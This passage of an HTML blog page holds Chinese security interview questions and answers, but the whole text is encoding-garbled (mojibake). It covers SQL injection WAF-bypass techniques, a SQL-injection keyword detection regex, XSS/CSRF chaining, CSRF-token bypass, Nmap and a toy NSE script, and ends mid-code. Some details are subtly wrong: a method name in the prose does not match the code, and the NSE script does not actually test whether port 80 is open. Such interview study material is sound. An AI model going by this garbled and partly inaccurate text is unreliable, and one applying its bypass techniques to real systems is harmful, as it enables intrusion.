</h3><ol><li><p><strong>å¤šè¿›ç¨‹</strong>ï¼š</p><ul><li><strong>é€‚ç”¨åœºæ™¯</strong>ï¼š<ul><li><strong>èµ„æºéš”ç¦»</strong>ï¼šéœ€è¦éš”ç¦»ä¸åŒä»»åŠ¡çš„èµ„æºï¼Œé¿å…ç›¸äº’å½±å“ã€‚</li><li><strong>è®¡ç®—å¯†é›†å‹ä»»åŠ¡</strong>ï¼šéœ€è¦åˆ©ç”¨å¤šæ ¸CPUçš„å¹¶è¡Œè®¡ç®—èƒ½åŠ›ã€‚</li></ul></li><li><strong>åŸå› </strong>ï¼šå¤šè¿›ç¨‹æä¾›äº†è‰¯å¥½çš„éš”ç¦»æ€§ï¼Œé€‚åˆéœ€è¦é«˜ç¨³å®šæ€§å’Œèµ„æºç‹¬ç«‹æ€§çš„åœºæ™¯ã€‚</li></ul></li><li><p><strong>å¤šçº¿ç¨‹</strong>ï¼š</p><ul><li><strong>é€‚ç”¨åœºæ™¯</strong>ï¼š<ul><li><strong>I&#x2F;Oå¯†é›†å‹ä»»åŠ¡</strong>ï¼šå¦‚ç½‘ç»œè¯·æ±‚ã€æ–‡ä»¶è¯»å†™ç­‰ï¼Œçº¿ç¨‹å¯ä»¥åˆ©ç”¨ç­‰å¾…æ—¶é—´è¿›è¡Œå…¶ä»–ä»»åŠ¡ã€‚</li><li><strong>å¹¶å‘å¤„ç†</strong>ï¼šå¦‚WebæœåŠ¡å™¨å¤„ç†å¤šä¸ªå®¢æˆ·ç«¯è¯·æ±‚ã€‚</li></ul></li><li><strong>åŸå› </strong>ï¼šå¤šçº¿ç¨‹çš„è½»é‡çº§ç‰¹æ€§å’Œå…±äº«èµ„æºçš„æœºåˆ¶ä½¿å…¶åœ¨å¹¶å‘å¤„ç†å’ŒI&#x2F;Oå¯†é›†å‹ä»»åŠ¡ä¸­è¡¨ç°ä¼˜å¼‚ã€‚</li></ul></li></ol><h3 id="SQLæ³¨å…¥ç»•è¿‡WAFçš„æ–¹å¼"><a href="#SQLæ³¨å…¥ç»•è¿‡WAFçš„æ–¹å¼" class="headerlink" title="SQLæ³¨å…¥ç»•è¿‡WAFçš„æ–¹å¼"></a>SQLæ³¨å…¥ç»•è¿‡WAFçš„æ–¹å¼</h3><ol><li><p><strong>ç¼–ç æ··æ·†</strong>ï¼š</p><ul><li><strong>URLç¼–ç </strong>ï¼šå°†SQLå…³é”®å­—è½¬æ¢ä¸ºURLç¼–ç å½¢å¼ï¼Œå¦‚<code>%27</code>ä»£æ›¿å•å¼•å·ã€‚</li><li><strong>Unicodeç¼–ç </strong>ï¼šä½¿ç”¨Unicodeç¼–ç ç»•è¿‡WAFæ£€æµ‹ã€‚</li></ul></li><li><p><strong>æ‹†åˆ†æŸ¥è¯¢</strong>ï¼š</p><ul><li><strong>åˆ†æ®µæ³¨å…¥</strong>ï¼šå°†SQLæŸ¥è¯¢æ‹†åˆ†ä¸ºå¤šä¸ªéƒ¨åˆ†ï¼Œåˆ†åˆ«æ³¨å…¥ï¼Œæœ€åç»„åˆæˆå®Œæ•´çš„æŸ¥è¯¢ã€‚</li></ul></li><li><p><strong>åè®®ç‰¹æ€§</strong>ï¼š</p><ul><li><strong>åˆ©ç”¨HTTPå¤´</strong>ï¼šå°†æ³¨å…¥ç‚¹æ”¾åœ¨HTTPå¤´ä¸­ï¼Œå¦‚User-Agentæˆ–Refererã€‚</li><li><strong>åˆ©ç”¨Cookie</strong>ï¼šé€šè¿‡Cookieå‚æ•°æ³¨å…¥SQLä»£ç ã€‚</li></ul></li><li><p><strong>é€»è¾‘æ¼æ´</strong>ï¼š</p><ul><li><strong>æ—¶é—´ç›²æ³¨</strong>ï¼šåˆ©ç”¨SQLçš„å»¶æ—¶å‡½æ•°ï¼ˆå¦‚<code>SLEEP</code>ï¼‰åˆ¤æ–­æŸ¥è¯¢ç»“æœã€‚</li><li><strong>å¸ƒå°”ç›²æ³¨</strong>ï¼šé€šè¿‡å¸ƒå°”è¡¨è¾¾å¼åˆ¤æ–­æŸ¥è¯¢ç»“æœã€‚</li></ul></li><li><p><strong>ç»•è¿‡æ–¹å¼çš„åŸç†</strong>ï¼š</p><ul><li><strong>ç¼–ç æ··æ·†</strong>ï¼šWAFé€šå¸¸å¯¹ç¼–ç åçš„å­—ç¬¦è¿›è¡Œæ£€æµ‹ï¼Œä½†å¯èƒ½æ— æ³•è¯†åˆ«æ‰€æœ‰ç¼–ç å½¢å¼ã€‚</li><li><strong>æ‹†åˆ†æŸ¥è¯¢</strong>ï¼šWAFå¯èƒ½æ— æ³•è¯†åˆ«æ‹†åˆ†åçš„SQLç‰‡æ®µã€‚</li><li><strong>åè®®ç‰¹æ€§</strong>ï¼šWAFå¯èƒ½å¯¹éä¼ ç»Ÿæ³¨å…¥ç‚¹ï¼ˆå¦‚HTTPå¤´ï¼‰æ£€æµ‹ä¸è¶³ã€‚</li><li><strong>åŸå› </strong>ï¼šWAFçš„è§„åˆ™é›†å’Œæ£€æµ‹æœºåˆ¶å¯èƒ½å­˜åœ¨æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™äº›æ¼æ´ç»•è¿‡æ£€æµ‹ã€‚</li></ul></li></ol><h3 id="FUZZç»•WAFçš„Payloadé•¿åº¦"><a href="#FUZZç»•WAFçš„Payloadé•¿åº¦" class="headerlink" title="FUZZç»•WAFçš„Payloadé•¿åº¦"></a>FUZZç»•WAFçš„Payloadé•¿åº¦</h3><p>FUZZç»•WAFçš„Payloadé•¿åº¦é€šå¸¸å–å†³äºWAFçš„è§„åˆ™å’Œæ£€æµ‹èƒ½åŠ›ã€‚ä¸€èˆ¬æ¥è¯´ï¼ŒPayloadé•¿åº¦å¯ä»¥ä»å‡ åå­—èŠ‚åˆ°å‡ ç™¾å­—èŠ‚ä¸ç­‰ã€‚ä¾‹å¦‚ï¼Œåœ¨ç»•è¿‡SQLæ³¨å…¥çš„åœºæ™¯ä¸­ï¼ŒPayloadå¯èƒ½åŒ…æ‹¬æ³¨é‡Šç¬¦ã€ç‰¹æ®Šå­—ç¬¦å’Œç¼–ç å­—ç¬¦ï¼Œé•¿åº¦å¯èƒ½åœ¨50-200å­—èŠ‚ä¹‹é—´ã€‚</p><h3 id="å†™è¿‡å“ªäº›æ­£åˆ™åŠå…·ä½“åœºæ™¯"><a href="#å†™è¿‡å“ªäº›æ­£åˆ™åŠå…·ä½“åœºæ™¯" class="headerlink" title="å†™è¿‡å“ªäº›æ­£åˆ™åŠå…·ä½“åœºæ™¯"></a>å†™è¿‡å“ªäº›æ­£åˆ™åŠå…·ä½“åœºæ™¯</h3><p>ä»¥ä¸‹æ˜¯ä¸€äº›å¸¸è§çš„æ­£åˆ™è¡¨è¾¾å¼åŠå…¶åº”ç”¨åœºæ™¯ï¼š</p><ol><li><p><strong>éªŒè¯IPv4åœ°å€</strong>ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.)&#123;3&#125;(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$</span><br></pre></td></tr></table></figure><p><strong>åº”ç”¨åœºæ™¯</strong>ï¼šç”¨äºéªŒè¯ç”¨æˆ·è¾“å…¥çš„IPåœ°å€æ˜¯å¦ç¬¦åˆIPv4æ ¼å¼ã€‚</p></li><li><p><strong>æå–URLä¸­çš„å‚æ•°</strong>ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">([a-zA-Z0-9_]+)=([^&amp;]*)(&amp;|$)</span><br></pre></td></tr></table></figure><p><strong>åº”ç”¨åœºæ™¯</strong>ï¼šä»URLä¸­æå–å‚æ•°åå’Œå‚æ•°å€¼ï¼Œä¾‹å¦‚ä»<code>http://example.com?id=123&amp;name=test</code>ä¸­æå–<code>id=123</code>å’Œ<code>name=test</code>ã€‚</p></li><li><p><strong>æ£€æµ‹SQLæ³¨å…¥</strong>ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(union|select|insert|update|delete|drop|alter|create|exec|execute|xp_cmdshell|or|and|;|--|/*|*/|&#x27;|&quot;)\s+</span><br></pre></td></tr></table></figure><p><strong>åº”ç”¨åœºæ™¯</strong>ï¼šæ£€æµ‹ç”¨æˆ·è¾“å…¥ä¸­æ˜¯å¦åŒ…å«SQLæ³¨å…¥çš„å…³é”®å­—ã€‚</p></li><li><p><strong>éªŒè¯ç”µå­é‚®ä»¶æ ¼å¼</strong>ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]&#123;2,&#125;$</span><br></pre></td></tr></table></figure><p><strong>åº”ç”¨åœºæ™¯</strong>ï¼šéªŒè¯ç”¨æˆ·è¾“å…¥çš„ç”µå­é‚®ä»¶åœ°å€æ˜¯å¦ç¬¦åˆæ ‡å‡†æ ¼å¼ã€‚</p></li></ol><h3 id="ä¸æŸ¥èµ„æ–™ä¸èƒ½æµ‹è¯•ç›´æ¥å†™IPv4çš„æ­£åˆ™"><a href="#ä¸æŸ¥èµ„æ–™ä¸èƒ½æµ‹è¯•ç›´æ¥å†™IPv4çš„æ­£åˆ™" class="headerlink" title="ä¸æŸ¥èµ„æ–™ä¸èƒ½æµ‹è¯•ç›´æ¥å†™IPv4çš„æ­£åˆ™"></a>ä¸æŸ¥èµ„æ–™ä¸èƒ½æµ‹è¯•ç›´æ¥å†™IPv4çš„æ­£åˆ™</h3><p>ä»¥ä¸‹æ˜¯éªŒè¯IPv4åœ°å€çš„æ­£åˆ™è¡¨è¾¾å¼ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.)&#123;3&#125;(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$</span><br></pre></td></tr></table></figure><p><strong>è¯´æ˜</strong>ï¼š</p><ul><li><code>25[0-5]</code>ï¼šåŒ¹é…250åˆ°255ä¹‹é—´çš„æ•°å­—ã€‚</li><li><code>2[0-4][0-9]</code>ï¼šåŒ¹é…200åˆ°249ä¹‹é—´çš„æ•°å­—ã€‚</li><li><code>[01]?[0-9][0-9]?</code>ï¼šåŒ¹é…0åˆ°199ä¹‹é—´çš„æ•°å­—ã€‚</li><li><code>\.)&#123;3&#125;</code>ï¼šåŒ¹é…ä¸‰ä¸ªç‚¹ï¼Œè¡¨ç¤ºå››ä¸ªå­—èŠ‚ä¹‹é—´çš„åˆ†éš”ç¬¦ã€‚</li></ul><h3 id="Javaåå°„æœºåˆ¶ä¼šå¯¼è‡´æ€æ ·çš„å®‰å…¨é—®é¢˜"><a href="#Javaåå°„æœºåˆ¶ä¼šå¯¼è‡´æ€æ ·çš„å®‰å…¨é—®é¢˜" class="headerlink" title="Javaåå°„æœºåˆ¶ä¼šå¯¼è‡´æ€æ ·çš„å®‰å…¨é—®é¢˜"></a>Javaåå°„æœºåˆ¶ä¼šå¯¼è‡´æ€æ ·çš„å®‰å…¨é—®é¢˜</h3><p>Javaåå°„æœºåˆ¶å…è®¸åœ¨è¿è¡Œæ—¶åŠ¨æ€åŠ è½½ç±»ã€è°ƒç”¨æ–¹æ³•å’Œè®¿é—®å­—æ®µï¼Œè¿™å¯èƒ½å¯¼è‡´ä»¥ä¸‹å®‰å…¨é—®é¢˜ï¼š</p><ol><li><p><strong>åŠ¨æ€åŠ è½½æ¶æ„ç±»</strong>ï¼š<br>åå°„æœºåˆ¶å¯ä»¥åŠ¨æ€åŠ è½½ç±»ï¼Œæ”»å‡»è€…å¯èƒ½åˆ©ç”¨è¿™ä¸€ç‚¹åŠ è½½æ¶æ„ç±»ï¼Œæ‰§è¡Œæœªç»æˆæƒçš„æ“ä½œã€‚</p></li><li><p><strong>è°ƒç”¨æ•æ„Ÿæ–¹æ³•</strong>ï¼š<br>åå°„å¯ä»¥è°ƒç”¨ç§æœ‰æˆ–å—ä¿æŠ¤çš„æ–¹æ³•ï¼Œç»•è¿‡æ­£å¸¸çš„è®¿é—®æ§åˆ¶ã€‚ä¾‹å¦‚ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReflectionExample</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">sensitiveMethod</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;This is a sensitive method&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ReflectionExample</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReflectionExample</span>();</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> ReflectionExample.class.getDeclaredMethod(<span class="string">&quot;sensitiveMethod&quot;</span>);</span><br><span class="line">        method.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        method.invoke(obj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™æ®µä»£ç é€šè¿‡åå°„è°ƒç”¨äº†<code>private</code>æ–¹æ³•<code>SensitiveMethod</code>ï¼Œç»•è¿‡äº†è®¿é—®æ§åˆ¶ã€‚</p></li><li><p><strong>ä¿¡æ¯æ³„éœ²</strong>ï¼š<br>åå°„å¯ä»¥è®¿é—®ç±»çš„ç§æœ‰å­—æ®µï¼Œå¯èƒ½å¯¼è‡´æ•æ„Ÿä¿¡æ¯æ³„éœ²ã€‚</p></li><li><p><strong>æ€§èƒ½é—®é¢˜</strong>ï¼š<br>åå°„æœºåˆ¶çš„ä½¿ç”¨å¯èƒ½å¯¼è‡´æ€§èƒ½ä¸‹é™ï¼Œå°¤å…¶æ˜¯åœ¨é¢‘ç¹è°ƒç”¨çš„æƒ…å†µä¸‹ã€‚</p></li></ol><h3 id="XSSå’ŒCSRFçš„ç›¸åŒç‚¹ä»¥åŠå¦‚ä½•é…åˆåˆ©ç”¨"><a href="#XSSå’ŒCSRFçš„ç›¸åŒç‚¹ä»¥åŠå¦‚ä½•é…åˆåˆ©ç”¨" class="headerlink" title="XSSå’ŒCSRFçš„ç›¸åŒç‚¹ä»¥åŠå¦‚ä½•é…åˆåˆ©ç”¨"></a>XSSå’ŒCSRFçš„ç›¸åŒç‚¹ä»¥åŠå¦‚ä½•é…åˆåˆ©ç”¨</h3><ul><li><strong>ç›¸åŒç‚¹</strong>ï¼š<ul><li><strong>æ»¥ç”¨ä¿¡ä»»å…³ç³»</strong>ï¼šä¸¤è€…éƒ½æ»¥ç”¨Webåº”ç”¨ç¨‹åºå’Œç”¨æˆ·ä¹‹é—´çš„ä¿¡ä»»å…³ç³»ã€‚XSSæ”»å‡»åˆ©ç”¨æœåŠ¡å™¨å¯¹ç”¨æˆ·è¾“å…¥æ•°æ®çš„ä¿¡ä»»ï¼ŒCSRFæ”»å‡»åˆ™åˆ©ç”¨æœåŠ¡å™¨å¯¹ç”¨æˆ·èº«ä»½çš„ä¿¡ä»»ã€‚</li><li><strong>æ”»å‡»ç›®æ ‡</strong>ï¼šéƒ½å¯èƒ½å¯¹ç”¨æˆ·æˆ–Webåº”ç”¨ç¨‹åºé€ æˆå±å®³ï¼Œå¦‚çªƒå–ç”¨æˆ·ä¿¡æ¯ã€æ‰§è¡Œéé¢„æœŸæ“ä½œç­‰ã€‚</li><li><strong>æœåŠ¡å™¨ç«¯é—®é¢˜</strong>ï¼šéƒ½æ˜¯ç”±äºæœåŠ¡å™¨ç«¯å¯¹ç”¨æˆ·æä¾›çš„æ•°æ®è¿‡äºä¿¡ä»»æˆ–è¿‡æ»¤ä¸ä¸¥å¯¼è‡´çš„ã€‚</li></ul></li><li><strong>é…åˆåˆ©ç”¨</strong>ï¼š<ul><li><strong>XSSä½œä¸ºè½½ä½“</strong>ï¼šåˆ©ç”¨XSSæ¼æ´æ³¨å…¥æ¶æ„è„šæœ¬ï¼Œè¯¥è„šæœ¬å¯ä»¥è‡ªåŠ¨å‘é€CSRFæ”»å‡»è¯·æ±‚ï¼Œæ— éœ€ç”¨æˆ·äº¤äº’ã€‚ä¾‹å¦‚ï¼Œæ”»å‡»è€…é€šè¿‡XSSæ¼æ´åœ¨ç›®æ ‡ç½‘ç«™æ³¨å…¥ä¸€æ®µJavaScriptä»£ç ï¼Œè¿™æ®µä»£ç ä¼šåœ¨ç”¨æˆ·è®¿é—®å—æ„ŸæŸ“é¡µé¢æ—¶è‡ªåŠ¨å‘é€CSRFè¯·æ±‚ï¼Œæ‰§è¡Œæ¶æ„æ“ä½œã€‚</li><li><strong>CSRFåˆ©ç”¨XSS</strong>ï¼šæ”»å‡»è€…å¯ä»¥å…ˆåˆ©ç”¨CSRFæ¼æ´ä¼ªé€ è¯·æ±‚ï¼Œå°†æ¶æ„è„šæœ¬æ³¨å…¥åˆ°ç”¨æˆ·çš„æµè§ˆå™¨ä¸­ï¼Œä»è€Œå®ç°XSSæ”»å‡»ã€‚ä¾‹å¦‚ï¼Œæ”»å‡»è€…æ„é€ ä¸€ä¸ªCSRFè¯·æ±‚ï¼Œå°†æ¶æ„è„šæœ¬å­˜å‚¨åœ¨ç›®æ ‡ç½‘ç«™çš„æŸä¸ªé¡µé¢ä¸­ï¼Œå½“ç”¨æˆ·è®¿é—®è¯¥é¡µé¢æ—¶ï¼Œæ¶æ„è„šæœ¬å°±ä¼šè¢«æ‰§è¡Œã€‚</li></ul></li></ul><h3 id="CSRF-TOKENçš„ä½ç½®ã€åŸç†å’Œç»•è¿‡"><a href="#CSRF-TOKENçš„ä½ç½®ã€åŸç†å’Œç»•è¿‡" class="headerlink" title="CSRF_TOKENçš„ä½ç½®ã€åŸç†å’Œç»•è¿‡"></a>CSRF_TOKENçš„ä½ç½®ã€åŸç†å’Œç»•è¿‡</h3><ul><li><strong>ä½ç½®</strong>ï¼šCSRF_TOKENé€šå¸¸ä½äºè¡¨å•çš„éšè—å­—æ®µä¸­ï¼Œæˆ–è€…ä½œä¸ºHTTPè¯·æ±‚å¤´çš„ä¸€éƒ¨åˆ†ã€‚</li><li><strong>åŸç†</strong>ï¼šCSRF_TOKENæ˜¯ä¸€ä¸ªéšæœºç”Ÿæˆçš„å€¼ï¼ŒæœåŠ¡å™¨åœ¨å¤„ç†è¯·æ±‚æ—¶ä¼šéªŒè¯è¯¥ä»¤ç‰Œæ˜¯å¦æœ‰æ•ˆã€‚å¦‚æœä»¤ç‰Œæ— æ•ˆï¼ŒæœåŠ¡å™¨å°†æ‹’ç»å¤„ç†è¯¥è¯·æ±‚ï¼Œä»è€Œé˜²æ­¢CSRFæ”»å‡»ã€‚</li><li><strong>ç»•è¿‡æ–¹æ³•</strong>ï¼š<ul><li><strong>XSSæ”»å‡»</strong>ï¼šé€šè¿‡XSSæ¼æ´çªƒå–CSRF_TOKENï¼Œç„¶ååœ¨CSRFæ”»å‡»ä¸­ä½¿ç”¨è¯¥ä»¤ç‰Œã€‚</li><li><strong>é¢„æµ‹ä»¤ç‰Œ</strong>ï¼šå¦‚æœCSRF_TOKENçš„ç”Ÿæˆç®—æ³•å­˜åœ¨æ¼æ´ï¼Œæ”»å‡»è€…å¯èƒ½é€šè¿‡é¢„æµ‹ä»¤ç‰Œæ¥ç»•è¿‡é˜²æŠ¤ã€‚</li><li><strong>åˆ©ç”¨ç¬¬ä¸‰æ–¹æ¼æ´</strong>ï¼šå¦‚æœç›®æ ‡ç½‘ç«™å­˜åœ¨å…¶ä»–æ¼æ´ï¼Œå¦‚SSRFï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™äº›æ¼æ´æ¥è·å–CSRF_TOKENã€‚</li></ul></li></ul><h3 id="å°½å¯èƒ½å¤šåœ°è¯´ä½ æ‰€çŸ¥é“çš„HTTPå¤´"><a href="#å°½å¯èƒ½å¤šåœ°è¯´ä½ æ‰€çŸ¥é“çš„HTTPå¤´" class="headerlink" title="å°½å¯èƒ½å¤šåœ°è¯´ä½ æ‰€çŸ¥é“çš„HTTPå¤´"></a>å°½å¯èƒ½å¤šåœ°è¯´ä½ æ‰€çŸ¥é“çš„HTTPå¤´</h3><ul><li><strong>è¯·æ±‚å¤´</strong>ï¼š<ul><li><strong>Host</strong>ï¼šæŒ‡å®šè¯·æ±‚çš„ä¸»æœºåå’Œç«¯å£å·ã€‚</li><li><strong>User-Agent</strong>ï¼šåŒ…å«å‘èµ·è¯·æ±‚çš„ç”¨æˆ·ä»£ç†ä¿¡æ¯ï¼Œå¦‚æµè§ˆå™¨ç±»å‹å’Œç‰ˆæœ¬ã€‚</li><li><strong>Referer</strong>ï¼šæŒ‡ç¤ºè¯·æ±‚çš„æ¥æºé¡µé¢ã€‚</li><li><strong>Cookie</strong>ï¼šåŒ…å«ç”¨æˆ·çš„ä¼šè¯ä¿¡æ¯ã€‚</li><li><strong>Authorization</strong>ï¼šç”¨äºHTTPè®¤è¯ã€‚</li><li><strong>Accept</strong>ï¼šæŒ‡å®šå®¢æˆ·ç«¯èƒ½å¤Ÿå¤„ç†çš„å†…å®¹ç±»å‹ã€‚</li><li><strong>Accept-Language</strong>ï¼šæŒ‡å®šå®¢æˆ·ç«¯åå¥½çš„è¯­è¨€ã€‚</li><li><strong>Accept-Encoding</strong>ï¼šæŒ‡å®šå®¢æˆ·ç«¯èƒ½å¤Ÿç†è§£çš„å†…å®¹ç¼–ç ã€‚</li><li><strong>Connection</strong>ï¼šæŒ‡å®šè¿æ¥ç±»å‹ï¼Œå¦‚<code>keep-alive</code>æˆ–<code>close</code>ã€‚</li></ul></li><li><strong>å“åº”å¤´</strong>ï¼š<ul><li><strong>Server</strong>ï¼šåŒ…å«æœåŠ¡å™¨çš„ä¿¡æ¯ã€‚</li><li><strong>Date</strong>ï¼šåŒ…å«å“åº”ç”Ÿæˆçš„æ—¥æœŸå’Œæ—¶é—´ã€‚</li><li><strong>Content-Type</strong>ï¼šæŒ‡å®šå“åº”çš„å†…å®¹ç±»å‹ã€‚</li><li><strong>Content-Length</strong>ï¼šæŒ‡å®šå“åº”å†…å®¹çš„é•¿åº¦ã€‚</li><li><strong>Set-Cookie</strong>ï¼šç”¨äºè®¾ç½®ç”¨æˆ·ä»£ç†çš„Cookieã€‚</li><li><strong>Location</strong>ï¼šç”¨äºé‡å®šå‘ã€‚</li><li><strong>WWW-Authenticate</strong>ï¼šç”¨äºå“åº”401æœªæˆæƒçŠ¶æ€ç ã€‚</li><li><strong>ETag</strong>ï¼šç”¨äºç¼“å­˜éªŒè¯ã€‚</li><li><strong>Cache-Control</strong>ï¼šæŒ‡å®šç¼“å­˜æœºåˆ¶ã€‚</li></ul></li></ul><h3 id="Nmapå¸¸è§æ‰«ææ–¹å¼çš„åŸç†ä»¥åŠNSEè„šæœ¬åŸç†"><a href="#Nmapå¸¸è§æ‰«ææ–¹å¼çš„åŸç†ä»¥åŠNSEè„šæœ¬åŸç†" class="headerlink" title="Nmapå¸¸è§æ‰«ææ–¹å¼çš„åŸç†ä»¥åŠNSEè„šæœ¬åŸç†"></a>Nmapå¸¸è§æ‰«ææ–¹å¼çš„åŸç†ä»¥åŠNSEè„šæœ¬åŸç†</h3><ul><li><strong>å¸¸è§æ‰«ææ–¹å¼</strong>ï¼š<ul><li><strong>TCP SYNæ‰«æ</strong>ï¼šå‘é€SYNåŒ…ï¼Œæ ¹æ®ç›®æ ‡ç«¯å£çš„å“åº”åˆ¤æ–­ç«¯å£çŠ¶æ€ã€‚</li><li><strong>TCP Connectæ‰«æ</strong>ï¼šå®ŒæˆTCPä¸‰æ¬¡æ¡æ‰‹ï¼Œåˆ¤æ–­ç«¯å£æ˜¯å¦å¼€æ”¾ã€‚</li><li><strong>UDPæ‰«æ</strong>ï¼šå‘é€UDPæ•°æ®åŒ…ï¼Œæ ¹æ®ç›®æ ‡ç«¯å£çš„å“åº”åˆ¤æ–­ç«¯å£çŠ¶æ€ã€‚</li><li><strong>ç‰ˆæœ¬æ£€æµ‹æ‰«æ</strong>ï¼šå‘é€ç‰¹å®šåè®®çš„æ•°æ®åŒ…ï¼Œæ£€æµ‹ç›®æ ‡æœåŠ¡çš„ç‰ˆæœ¬ä¿¡æ¯ã€‚</li></ul></li><li><strong>NSEè„šæœ¬åŸç†</strong>ï¼š<ul><li><strong>NSEè„šæœ¬</strong>ï¼šç”¨äºè‡ªåŠ¨åŒ–å®‰å…¨æµ‹è¯•å’Œä¿¡æ¯æ”¶é›†ã€‚NSEè„šæœ¬å¯ä»¥æ‰§è¡Œå„ç§ä»»åŠ¡ï¼Œå¦‚ç«¯å£æ‰«æã€æ¼æ´æ£€æµ‹ã€ä¿¡æ¯æ”¶é›†ç­‰ã€‚</li><li><strong>è„šæœ¬æ‰§è¡Œ</strong>ï¼šNSEè„šæœ¬åœ¨Nmapçš„æ‰«æè¿‡ç¨‹ä¸­æ‰§è¡Œï¼Œå¯ä»¥æ ¹æ®æ‰«æç»“æœåŠ¨æ€è°ƒæ•´æ‰«æç­–ç•¥ã€‚</li><li><strong>ç¤ºä¾‹è„šæœ¬</strong>ï¼šä»¥ä¸‹æ˜¯ä¸€ä¸ªç®€å•çš„NSEè„šæœ¬ï¼Œç”¨äºæ£€æµ‹ç›®æ ‡ä¸»æœºæ˜¯å¦å¼€æ”¾äº†æŸä¸ªç«¯å£ï¼š  <figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">description = <span class="string">[[</span></span><br><span class="line"><span class="string">Simple NSE script to detect if a port is open.</span></span><br><span class="line"><span class="string">]]</span></span><br><span class="line">author = <span class="string">&quot;Your Name&quot;</span></span><br><span class="line">license = <span class="string">&quot;Same as Nmap--See https://nmap.org/book/man-legal.html&quot;</span></span><br><span class="line">categories = &#123;<span class="string">&quot;default&quot;</span>, <span class="string">&quot;safe&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">portrule = <span class="function"><span class="keyword">function</span><span class="params">(host, port)</span></span></span><br><span class="line">    <span class="keyword">return</span> port.number == <span class="number">80</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">action = <span class="function"><span class="keyword">function</span><span class="params">(host, port)</span></span></span><br><span class="line">    nmap.outputln(<span class="string">&quot;Port 80 is open on &quot;</span> .. host.ip)</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>  è¿™ä¸ªè„šæœ¬ä¼šåœ¨æ‰«æè¿‡ç¨‹ä¸­æ£€æŸ¥ç›®æ ‡ä¸»æœºçš„80ç«¯å£æ˜¯å¦å¼€æ”¾ï¼Œå¹¶è¾“å‡ºç›¸åº”çš„ç»“æœã€‚</li></ul></li></ul><h3 id="è·¨åŸŸçš„è§£å†³åŠæ³•åŸç†ä»¥åŠå®‰å…¨é—®é¢˜"><a href="#è·¨åŸŸçš„è§£å†³åŠæ³•åŸç†ä»¥åŠå®‰å…¨é—®é¢˜" class="headerlink" title="è·¨åŸŸçš„è§£å†³åŠæ³•åŸç†ä»¥åŠå®‰å…¨é—®é¢˜"></a>è·¨åŸŸçš„è§£å†³åŠæ³•åŸç†ä»¥åŠå®‰å…¨é—®é¢˜</h3><h4 id="1-CORSï¼ˆè·¨åŸŸèµ„æºå…±äº«ï¼‰"><a href="#1-CORSï¼ˆè·¨åŸŸèµ„æºå…±äº«ï¼‰" class="headerlink" title="1. CORSï¼ˆè·¨åŸŸèµ„æºå…±äº«ï¼‰"></a>1. CORSï¼ˆè·¨åŸŸèµ„æºå…±äº«ï¼‰</h4><p><strong>åŸç†</strong>ï¼šCORSé€šè¿‡æœåŠ¡ç«¯è®¾ç½®HTTPå“åº”å¤´ï¼Œå£°æ˜å…è®¸çš„è·¨åŸŸè¯·æ±‚æ¥æºä¸æ–¹æ³•ã€‚æœåŠ¡ç«¯éœ€è¦åœ¨å“åº”å¤´ä¸­æ·»åŠ å¦‚<code>Access-Control-Allow-Origin</code>ç­‰å­—æ®µï¼Œå‘Šè¯‰æµè§ˆå™¨å“ªäº›æºå¯ä»¥è®¿é—®è¯¥èµ„æºã€‚</p><p><strong>ç¤ºä¾‹ä»£ç </strong>ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 